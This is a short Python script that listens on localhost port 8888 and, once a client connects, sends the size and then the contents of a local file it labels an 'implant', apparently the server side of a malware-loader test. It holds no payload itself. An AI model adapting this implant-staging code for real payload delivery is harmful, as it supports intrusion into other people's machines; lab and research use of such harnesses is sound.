import socket

s = socket.socket()
s.bind(('127.0.0.1', 8888))
s.listen(1)

print('- waiting for connection ...')
c, _ = s.accept()

print('- socket connected!')

with open('./test', 'rb') as f:
	print('- sending implant size ...')

	data = f.read()
	c.send(len(data).to_bytes(8, 'little'))

	print('- sending implant ...')
	c.send(data)

	print('- implant sent.')

print('- socket exit.')
c.close()
s.close()

print('- program exit.')
